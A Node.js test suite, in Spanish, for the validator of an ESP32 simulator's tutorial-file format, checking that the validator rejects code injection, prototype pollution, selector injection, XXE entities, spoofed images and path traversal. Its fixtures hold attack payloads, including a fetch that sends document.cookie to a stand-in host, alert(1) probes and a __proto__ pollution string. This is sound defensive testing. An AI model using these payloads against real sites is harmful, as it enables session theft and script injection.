const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const TF = require("../ui/TutorialFormat");

const base = () => ({
  format: "pitsim-tutorial",
  formatVersion: 1,
  id: "prueba",
  title: "Prueba",
  steps: [{ title: "Uno", text: "Hola" }],
});

const errorsOf = (obj) => {
  const r = TF.validate(typeof obj === "string" ? obj : JSON.stringify(obj));
  assert.equal(r.ok, false, "debía rechazarse");
  return r.errors.join("\n");
};

// PNG de 1x1 real
const PNG_1PX = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";

test("acepta un tutorial mínimo y los ejemplos de examples/tutoriales", () => {
  assert.equal(TF.validate(JSON.stringify(base())).ok, true);
  const dir = path.join(__dirname, "..", "..", "examples", "tutoriales");
  for (const f of fs.readdirSync(dir).filter((n) => n.endsWith(".json"))) {
    const r = TF.validate(fs.readFileSync(path.join(dir, f), "utf8"));
    assert.equal(r.ok, true, `${f}: ${r.errors.join(" | ")}`);
  }
});

test("rechaza lo que no es JSON, otro formato o una versión futura", () => {
  assert.match(errorsOf("{ no es json"), /JSON/);
  assert.match(errorsOf({ ...base(), format: "otro" }), /format/);
  assert.match(errorsOf({ ...base(), formatVersion: 2 }), /actualiza el simulador/);
  assert.match(errorsOf("[]"), /objeto/);
});

test("no hay forma de meter código: claves de funciones se rechazan", () => {
  const t = base();
  t.steps[0].isDone = "() => fetch('https://malo.example/' + document.cookie)";
  t.steps[0].onEnter = "alert(1)";
  t.steps[0].highlight = { type: "ui", target: "editor", run: "alert(1)" };
  const e = errorsOf(t);
  assert.match(e, /campo no permitido "isDone"/);
  assert.match(e, /campo no permitido "onEnter"/);
  assert.match(e, /campo no permitido "run"/);
});

test("__proto__ en el archivo se rechaza y no contamina Object.prototype", () => {
  const json = '{"format":"pitsim-tutorial","formatVersion":1,"id":"x","title":"x","steps":[{"title":"a"}],"__proto__":{"pwned":true}}';
  assert.match(errorsOf(json), /__proto__/);
  assert.equal({}.pwned, undefined);
  const json2 = '{"format":"pitsim-tutorial","formatVersion":1,"id":"x","title":"x","steps":[{"title":"a","constructor":{"prototype":{"pwned":1}}}]}';
  assert.match(errorsOf(json2), /constructor/);
  assert.equal({}.pwned, undefined);
});

test("los selectores CSS nunca vienen del archivo", () => {
  const t = base();
  t.steps[0].highlight = { type: "ui", target: "body *" };
  assert.match(errorsOf(t), /target: valor no permitido/);

  const t2 = base();
  t2.steps[0].highlight = { type: "component", component: 'ky_004"], *[x="' };
  assert.match(errorsOf(t2), /tipo de componente/);

  const t3 = base();
  t3.steps[0].check = { type: "wire", from: { component: "esp32_wroom", pin: 'io2"]' }, to: { pinType: "gpio" } };
  assert.match(errorsOf(t3), /id de pin/);
});

test("tipos de condición y acción fuera de la lista blanca se rechazan", () => {
  const t = base();
  t.steps[0].check = { type: "eval", code: "1" };
  t.steps[0].actions = [{ type: "runCode", code: "import os" }];
  const e = errorsOf(t);
  assert.match(e, /check\.type: valor no permitido/);
  assert.match(e, /actions\[0\]\.type: valor no permitido/);
});

test("imagen: solo PNG/GIF/JPEG/WEBP embebidas y que lo sean de verdad", () => {
  const withImg = (img) => ({ ...base(), demoImage: img });
  assert.equal(TF.validate(JSON.stringify(withImg(PNG_1PX))).ok, true);
  assert.match(errorsOf(withImg("data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+")), /PNG, GIF, JPEG o WEBP/);
  assert.match(errorsOf(withImg("https://rastreo.example/pixel.gif")), /embebidas/);
  assert.match(errorsOf(withImg("javascript:alert(1)")), /embebidas/);
  // dice PNG pero el contenido es texto
  assert.match(errorsOf(withImg("data:image/png;base64," + Buffer.from("<script>alert(1)</script>").toString("base64"))), /no es realmente una imagen PNG/);
  assert.match(errorsOf(withImg("data:image/png;base64," + "A".repeat(TF.LIMITS.image))), /demasiado grande/);
});

test("bloques: solo etiquetas de Blockly, sin DOCTYPE/entidades/CDATA", () => {
  const withXml = (xml) => {
    const t = base();
    t.steps[0].actions = [{ type: "openBlocks", xml }];
    return t;
  };
  assert.equal(TF.validate(JSON.stringify(withXml('<xml><block type="text_print"></block></xml>'))).ok, true);
  assert.match(errorsOf(withXml('<!DOCTYPE x [<!ENTITY a "aaaa">]><xml>&a;</xml>')), /programa de bloques|DOCTYPE/);
  assert.match(errorsOf(withXml('<xml><!ENTITY a "x"></xml>')), /DOCTYPE/);
  assert.match(errorsOf(withXml("<xml><script>alert(1)</script></xml>")), /etiqueta no permitida <script>/);
  assert.match(errorsOf(withXml('<xml><svg:image xlink:href="x"/></xml>')), /etiqueta no permitida/);
  assert.match(errorsOf(withXml("no es xml")), /programa de bloques/);
});

test("límites de tamaño", () => {
  const many = base();
  many.steps = Array.from({ length: TF.LIMITS.steps + 1 }, (_, i) => ({ title: "p" + i }));
  assert.match(errorsOf(many), /demasiados pasos/);

  const long = base();
  long.steps[0].text = "x".repeat(TF.LIMITS.text + 1);
  assert.match(errorsOf(long), /demasiado largo/);

  assert.match(errorsOf("x".repeat(TF.LIMITS.fileChars + 1)), /demasiado grande/);

  const bad = base();
  bad.id = "../../etc";
  assert.match(errorsOf(bad), /id/);
});

test("limpia caracteres de control y marcas bidi que disfrazan texto", () => {
  const t = base();
  t.title = "Tutorial‮gnp.exe\u0007";
  t.steps[0].text = "línea 1\r\nlínea 2\u0000";
  const r = TF.validate(JSON.stringify(t));
  assert.equal(r.ok, true);
  assert.equal(r.data.title, "Tutorialgnp.exe");
  assert.equal(r.data.steps[0].text, "línea 1\nlínea 2");
});

test("toJSON quita lo interno y lo exportado se vuelve a validar igual", () => {
  const r = TF.validate(JSON.stringify({ ...base(), steps: [{ preset: "simulate" }, { title: "Fin" }] }));
  const out = TF.toJSON(r.data);
  assert.ok(!out.includes("_resolved"));
  const again = TF.validate(out);
  assert.equal(again.ok, true);
  assert.equal(TF.toJSON(again.data), out);
});

// ---- compile: el comportamiento sale de funciones nuestras ----

function fakeTm({ comps = [], wires = [], running = false, dirty = true, code = "" } = {}) {
  const calls = [];
  const byId = new Map(comps.map((c) => [c.id, c]));
  const tm = {
    calls,
    simulator: {
      isRunning: running,
      projectManager: { dirty },
      componentManager: { getAll: () => comps, get: (id) => byId.get(id) },
      wireManager: { wires },
    },
    replPanel: {
      open: false,
      editor: { value: code },
      codeMirror: { setValue: (v) => { calls.push(["setValue", v]); tm.replPanel.editor.value = v; } },
      toggle: () => { tm.replPanel.open = !tm.replPanel.open; },
      switchTab: (t) => calls.push(["switchTab", t]),
      runEditorCode: () => calls.push(["RUN"]),
    },
    hasComponentCount: (type, min) => comps.filter((c) => c.type === type).length >= min,
    highlightElements: (sels) => calls.push(["highlight", sels]),
    highlightToolboxAndCanvas: (t) => calls.push(["highlightType", t]),
    highlightPins: (e) => calls.push(["pins", e.length]),
  };
  // misma lógica que TutorialManager.hasWireBetweenComponents
  tm.hasWireBetweenComponents = (a, b) => wires.some((w) => {
    const ea = byId.get(w.from.componentId), eb = byId.get(w.to.componentId);
    const pa = ea?.pins.find((p) => p.id === w.from.pinId), pb = eb?.pins.find((p) => p.id === w.to.pinId);
    if (!pa || !pb) return false;
    return (a(ea, pa) && b(eb, pb)) || (a(eb, pb) && b(ea, pa));
  });
  return tm;
}

const ESP = { id: "e1", type: "esp32_wroom", pins: [
  { id: "gnd_1", type: "ground" }, { id: "io12", type: "gpio" }, { id: "io34", type: "gpio", inputOnly: true }, { id: "tx0", type: "gpio", signal: "uart" },
] };
const BTN = { id: "b1", type: "ky_004", pins: [{ id: "senal", type: "gpio" }, { id: "gnd", type: "ground" }] };

test("compile: id con prefijo import:, numeración y condiciones", () => {
  const r = TF.validate(fs.readFileSync(path.join(__dirname, "..", "..", "examples", "tutoriales", "plantilla_boton.json"), "utf8"));
  const t = TF.compile(r.data);
  assert.equal(t.id, "import:boton-contador");
  assert.equal(t.imported, true);
  assert.equal(t.steps[0].title, "Paso 1 — Crea un proyecto nuevo");
  assert.equal(t.steps.at(-1).isLast, true);

  const signalStep = t.steps.find((s) => /señal/.test(s.title));
  const wire = (pin) => ({ from: { componentId: "e1", pinId: pin }, to: { componentId: "b1", pinId: "senal" } });
  assert.equal(signalStep.isDone(fakeTm({ comps: [ESP, BTN], wires: [wire("io12")] })), true);
  assert.equal(signalStep.isDone(fakeTm({ comps: [ESP, BTN], wires: [wire("io34")] })), false, "pin solo-entrada no cuenta");
  assert.equal(signalStep.isDone(fakeTm({ comps: [ESP, BTN], wires: [wire("tx0")] })), false, "UART no cuenta");
  assert.equal(signalStep.isDone(fakeTm({ comps: [ESP, BTN], wires: [] })), false);

  const btnStep = t.steps.find((s) => /Toma el botón/.test(s.title));
  assert.equal(btnStep.isDone(fakeTm({ comps: [ESP] })), false);
  assert.equal(btnStep.isDone(fakeTm({ comps: [ESP, BTN] })), true);
});

test("compile: insertCode pone el código en el editor pero NUNCA lo ejecuta", () => {
  const t = base();
  t.steps[0].actions = [{ type: "insertCode", code: "print('hola')\n" }];
  const tut = TF.compile(TF.validate(JSON.stringify(t)).data);
  const tm = fakeTm();
  tut.steps[0].actions[0].run(tm);
  assert.deepEqual(tm.calls.find((c) => c[0] === "setValue"), ["setValue", "print('hola')\n"]);
  assert.ok(!tm.calls.some((c) => c[0] === "RUN"), "no debe ejecutar");
});

test("compile: resaltado de interfaz usa solo selectores de la lista fija", () => {
  const t = base();
  t.steps[0].highlight = { type: "ui", target: "simulate" };
  const tut = TF.compile(TF.validate(JSON.stringify(t)).data);
  const tm = fakeTm();
  tut.steps[0].highlight(tm);
  assert.deepEqual(tm.calls[0], ["highlight", ["#btnSimToggle"]]);
});
